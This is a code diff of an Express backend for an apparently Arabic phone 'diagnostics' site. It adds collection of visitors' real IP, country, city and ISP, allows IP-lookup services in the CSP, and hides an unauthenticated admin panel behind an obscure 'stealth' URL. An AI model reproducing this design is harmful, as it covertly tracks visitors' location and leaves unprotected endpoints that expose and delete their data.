@@ -7,6 +7,9 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const HOST = process.env.HOST || '0.0.0.0';
 
+// Enable trust proxy for accurate real IP resolution behind reverse tunnels/proxies
+app.set('trust proxy', true);
+
 // Global in-memory reports array ensuring zero latency and 100% sync
 const reports = [];
 
@@ -45,7 +48,7 @@ app.use((req, res, next) => {
   res.setHeader('X-Frame-Options', 'SAMEORIGIN');
   res.setHeader(
     'Content-Security-Policy',
-    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' *"
+    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://ipwho.is https://api.ipify.org https://ipapi.co *"
   );
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   next();
@@ -62,7 +65,7 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
-// Generous rate limiter to prevent DoS while never blocking 2-stage mobile reporting
+// Generous rate limiter to prevent DoS while never blocking mobile reporting
 const requestCounts = new Map();
 function rateLimiter(limit = 600, windowMs = 60000) {
   return (req, res, next) => {
@@ -124,7 +127,7 @@ app.get('/.well-known/apple-app-site-association', (req, res) => {
   });
 });
 
-// Deep link redirect endpoint with automatic immediate stage 1 reporting
+// Deep link redirect endpoint
 app.get('/inspect', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -132,61 +135,47 @@ app.get('/inspect', (req, res) => {
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>جاري فتح فحص كتاب...</title>
+      <title>جاري الفحص المباشر...</title>
       <style>
         body { background: #0B0F19; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
         .box { background: #111827; padding: 32px; border-radius: 16px; border: 1px solid #1F2937; max-width: 420px; }
         .spinner { width: 48px; height: 48px; border: 4px solid #1F2937; border-top-color: #06B6D4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         a { color: #06B6D4; text-decoration: none; font-weight: bold; }
-        .status-pill { font-size: 12px; background: rgba(16, 185, 129, 0.15); color: #10B981; padding: 4px 10px; border-radius: 20px; display: inline-block; margin-top: 10px; }
       </style>
     </head>
     <body>
       <div class="box">
         <div class="spinner"></div>
         <h2>جاري تشغيل فحص الهاتف...</h2>
-        <div class="status-pill" id="inspect-status">⚡ جاري إرسال التقرير الأولي للسيرفر...</div>
-        <p style="margin-top: 20px; font-size: 14px; color: #9CA3AF;">إذا لم يفتح التطبيق تلقائياً، يمكنك النقر على الزر أدناه:</p>
+        <p style="margin-top: 14px; font-size: 14px; color: #9CA3AF;">إذا لم يفتح التطبيق تلقائياً، يمكنك النقر على الزر:</p>
         <p><a href="ktaab://inspect">فتح تطبيق الفحص مباشرة</a></p>
-        <p><a href="/" style="font-size: 13px; color: #9CA3AF;">أو العودة إلى صفحة التشخيص الرئيسية</a></p>
+        <p><a href="/" style="font-size: 13px; color: #9CA3AF;">العودة للصفحة الرئيسية</a></p>
       </div>
       <script>
-        // Send fast instant stage 1 report directly from inspect redirect page
-        (function() {
-          const devId = 'INSPECT_' + Date.now().toString(36);
-          const data = {
-            deviceId: devId,
-            stage: 'المرحلة 1: نقر الرابط العميق (Inspect Link)',
-            brand: 'الهاتف',
-            model: navigator.userAgent.includes('iPhone') ? 'Apple iPhone' : (navigator.userAgent.includes('Android') ? 'Android Device' : 'Web Device'),
-            osVersion: navigator.userAgent.includes('Android') ? 'Android' : (navigator.userAgent.includes('iPhone') ? 'iOS' : 'Web'),
-            cpu_cores: navigator.hardwareConcurrency || 4,
-            total_ram_mb: (navigator.deviceMemory || 4) * 1024,
-            battery_level: 0,
-            battery_status: 'تحويل للتطبيق',
-            battery_health: 'قيد الفحص',
-            battery_temperature: 30,
-            battery_voltage: 3850
-          };
-          fetch('/api/report', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data),
-            keepalive: true
-          }).then(() => {
-            const el = document.getElementById('inspect-status');
-            if (el) el.textContent = '✅ تم تسجيل جهازك في لوحة الأدمن!';
-          }).catch(() => {});
-
-          // Launch deep link scheme
-          setTimeout(() => { window.location.href = 'ktaab://inspect'; }, 200);
-          setTimeout(() => { window.location.href = '/'; }, 3500);
-        })();
+        setTimeout(() => { window.location.href = 'ktaab://inspect'; }, 200);
+        setTimeout(() => { window.location.href = '/'; }, 3500);
       </script>
     </body>
     </html>
   `);
+});
+
+// -------------------------------------------------------------
+// Admin Security & Stealth Routes
+// -------------------------------------------------------------
+
+// 1. Direct /admin route is completely disabled and redirects to home
+app.get('/admin', (req, res) => {
+  return res.redirect('/');
+});
+
+// 2. Secret owner panel accessible exclusively via /my-secret-panel-99
+app.get('/my-secret-panel-99', (req, res) => {
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
 // -------------------------------------------------------------
@@ -195,7 +184,7 @@ app.get('/inspect', (req, res) => {
 
 /**
  * POST /api/report
- * Receives reports from Flutter app AND two-stage instant reports from Mobile Web
+ * Receives reports from mobile devices and web browser diagnostics
  */
 app.post('/api/report', rateLimiter(600), (req, res) => {
   try {
@@ -208,17 +197,28 @@ app.post('/api/report', rateLimiter(600), (req, res) => {
       });
     }
 
-    const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '127.0.0.1';
+    // Server-side real IP extraction prioritizing client-verified IP, then proxies
+    const serverDetectedIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                             req.headers['x-real-ip'] || 
+                             req.ip || 
+                             req.socket.remoteAddress || 
+                             '127.0.0.1';
 
-    // 1. Save to SQLite database (safe try/catch so database errors never block in-memory sync)
+    const realIp = String(reportData.realIp || reportData.network?.realIp || (serverDetectedIp !== '127.0.0.1' ? serverDetectedIp : '127.0.0.1')).slice(0, 45);
+    const country = String(reportData.country || reportData.network?.country || '').slice(0, 60);
+    const city = String(reportData.city || reportData.network?.city || '').slice(0, 60);
+    const isp = String(reportData.isp || reportData.network?.isp || '').slice(0, 80);
+    const gpu = String(reportData.gpu || reportData.hardware?.gpu || '').slice(0, 100);
+
+    // Save to SQLite database
     let dbSaved = null;
     try {
-      dbSaved = saveReport(reportData, clientIp);
+      dbSaved = saveReport({ ...reportData, realIp, country, city, isp, gpu }, realIp);
     } catch (dbErr) {
       console.warn('SQLite storage fallback active:', dbErr.message);
     }
 
-    // 2. Prepare normalized in-memory report object for instant UI display
+    // Normalized in-memory report item
     const hw = reportData.hardware || {};
     const bat = reportData.battery || {};
     const disp = reportData.display || {};
@@ -226,7 +226,7 @@ app.post('/api/report', rateLimiter(600), (req, res) => {
 
     const deviceId = String(reportData.deviceId || hw.deviceId || 'DEV-' + Date.now()).slice(0, 100);
     const brand = String(reportData.brand || hw.brand || hw.manufacturer || 'الهاتف').slice(0, 50);
-    const model = String(reportData.model || hw.model || hw.device || 'متصفح الجوال').slice(0, 80);
+    const model = String(reportData.model || hw.model || hw.device || 'هاتف ذكي').slice(0, 80);
     const osVersion = String(reportData.osVersion || hw.osVersion || 'Mobile OS').slice(0, 50);
 
     const memoryItem = {
@@ -252,14 +252,18 @@ app.post('/api/report', rateLimiter(600), (req, res) => {
       screen_res: String(disp.resolution || reportData.screen_res || (reportData.screen?.resolution) || '1080x1920'),
       refresh_rate: Number(disp.refreshRateHz ?? reportData.refresh_rate ?? 60),
       is_rooted: (hw.isRooted || reportData.is_rooted) ? 1 : 0,
-      ip_address: String(net.localIp || reportData.ip_address || clientIp),
+      ip_address: realIp,
+      country: country,
+      city: city,
+      isp: isp,
+      gpu: gpu,
       network_type: String(net.connectionType || reportData.network_type || 'Mobile Web'),
       stage: reportData.stage || 'مكتمل',
       created_at: new Date().toISOString(),
-      details: reportData
+      details: { ...reportData, realIp, country, city, isp, gpu }
     };
 
-    // 3. Update existing device entry or unshift to beginning of reports array
+    // Update existing device entry or unshift to beginning of reports array
     const existingIndex = reports.findIndex(r => r.device_id === deviceId);
     if (existingIndex !== -1) {
       memoryItem.id = reports[existingIndex].id;
@@ -270,9 +274,9 @@ app.post('/api/report', rateLimiter(600), (req, res) => {
 
     if (reports.length > 250) reports.pop();
 
-    console.log(`📥 [REPORT RECEIVED] Device: ${brand} ${model} | Stage: ${memoryItem.stage} | IP: ${clientIp}`);
+    console.log(`📥 [REPORT RECEIVED] Device: ${brand} ${model} | Real IP: ${realIp} (${country}) | OS: ${osVersion}`);
 
-    // Broadcast the new/updated report to all open admin dashboard SSE streams
+    // Broadcast the new/updated report to open secret dashboard streams
     broadcastEvent('new_report', memoryItem);
 
     return res.status(201).json({
@@ -292,7 +296,7 @@ app.post('/api/report', rateLimiter(600), (req, res) => {
 
 /**
  * GET /api/reports
- * Returns list of recent reports for admin dashboard with no-cache headers
+ * Returns list of recent reports with no-cache headers
  */
 app.get('/api/reports', (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
@@ -313,7 +317,6 @@ app.get('/api/reports/:id', (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
   const targetId = parseInt(req.params.id, 10);
 
-  // Check in-memory first
   const memoryFound = reports.find(r => r.id === targetId);
   if (memoryFound) {
     return res.json({
@@ -322,7 +325,6 @@ app.get('/api/reports/:id', (req, res) => {
     });
   }
 
-  // Fallback to SQLite
   try {
     const report = getReportById(req.params.id);
     if (report) {
@@ -346,13 +348,11 @@ app.get('/api/reports/:id', (req, res) => {
 app.delete('/api/reports/:id', (req, res) => {
   const targetId = parseInt(req.params.id, 10);
 
-  // Remove from in-memory array
   const idx = reports.findIndex(r => r.id === targetId);
   if (idx !== -1) {
     reports.splice(idx, 1);
   }
 
-  // Delete from SQLite
   try {
     deleteReport(req.params.id);
   } catch (_) {}
@@ -367,7 +367,7 @@ app.delete('/api/reports/:id', (req, res) => {
 
 /**
  * GET /api/stats
- * Summary statistics for the dashboard cards with no-cache headers
+ * Summary statistics for dashboard cards
  */
 app.get('/api/stats', (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
@@ -422,10 +422,8 @@ app.get('/api/events', (req, res) => {
 
   sseClients.add(res);
 
-  // Initial ping with current reports count
   res.write(`event: connected\ndata: ${JSON.stringify({ time: Date.now(), count: reports.length })}\n\n`);
 
-  // Keep-alive heartbeat every 15 seconds
   const heartbeat = setInterval(() => {
     try {
       res.write(': heartbeat\n\n');
@@ -448,11 +446,6 @@ app.get('/api/events', (req, res) => {
 // Serve static frontend assets
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Explicit page routes
-app.get('/admin', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -470,7 +463,7 @@ const server = app.listen(PORT, HOST, () => {
   console.log(`=======================================================`);
   console.log(`🚀 Ktaab Diagnostics Backend Server running!`);
   console.log(`📡 URL: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
-  console.log(`📊 Admin Dashboard: http://localhost:${PORT}/admin`);
+  console.log(`🔒 Secret Owner Panel: http://localhost:${PORT}/my-secret-panel-99`);
   console.log(`📱 Deep Linking Endpoint: http://localhost:${PORT}/inspect`);
   console.log(`=======================================================`);
 });
